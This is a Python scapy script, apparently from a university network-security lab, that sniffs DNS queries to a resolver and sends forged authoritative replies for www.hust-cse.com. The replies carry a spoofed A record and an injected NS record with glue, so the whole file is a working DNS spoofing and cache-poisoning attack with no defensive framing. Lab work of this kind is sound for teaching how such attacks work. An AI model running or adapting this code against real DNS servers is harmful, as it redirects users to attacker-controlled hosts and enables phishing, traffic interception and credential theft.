#!/usr/bin/env python
from scapy.all import *
import time

# Configuration parameters
DNS_SERVER_IP = "10.10.27.2"
ATTACK_IFACE = "br-xxx"
TARGET_DOMAIN = "www.hust-cse.com"
A_RECORD_IP = "20.21.9.1"
NS_DOMAIN = "ns.hust-cse.com"
NS_A_RECORD_IP = "20.24.4.9"

def spoof_dns_response(pkt):
    if (UDP in pkt and DNS in pkt and 
        pkt[UDP].dport == 53 and 
        pkt[IP].dst == DNS_SERVER_IP and 
        TARGET_DOMAIN in pkt[DNS].qd.qname.decode('utf-8')):
        
        ip_layer = IP(dst=pkt[IP].dst, src=pkt[IP].src)
        udp_layer = UDP(dport=pkt[UDP].sport, sport=53)
        
        ans_section = DNSRR(
            rrname=TARGET_DOMAIN + ".",
            type="A",
            ttl=259200,
            rdata=A_RECORD_IP
        )
        
        ns_section = DNSRR(
            rrname="hust-cse.com.",
            type="NS",
            ttl=259200,
            rdata=NS_DOMAIN + "."
        )
        
        ar_section = DNSRR(
            rrname=NS_DOMAIN + ".",
            type="A",
            ttl=259200,
            rdata=NS_A_RECORD_IP
        )
        
        dns_layer = DNS(
            id=pkt[DNS].id,
            qd=pkt[DNS].qd,
            qr=1,
            aa=1,
            rd=0,
            qdcount=1,
            ancount=1,
            nscount=1,
            arcount=1,
            an=ans_section,
            ns=ns_section,
            ar=ar_section
        )
        
        spoof_pkt = ip_layer / udp_layer / dns_layer
        send(spoof_pkt, iface=ATTACK_IFACE, verbose=0)
        print(f"[+] Spoofed response for {TARGET_DOMAIN} sent to {DNS_SERVER_IP}")

if __name__ == "__main__":
    print(f"[*] Started monitoring DNS queries to {DNS_SERVER_IP} (Interface: {ATTACK_IFACE})")
    print(f"[*] Attack is running continuously. Press Ctrl+C to stop")
    sniff(
        filter=f"udp port 53 and dst host {DNS_SERVER_IP}",
        prn=spoof_dns_response,
        iface=ATTACK_IFACE,
        store=0
    )
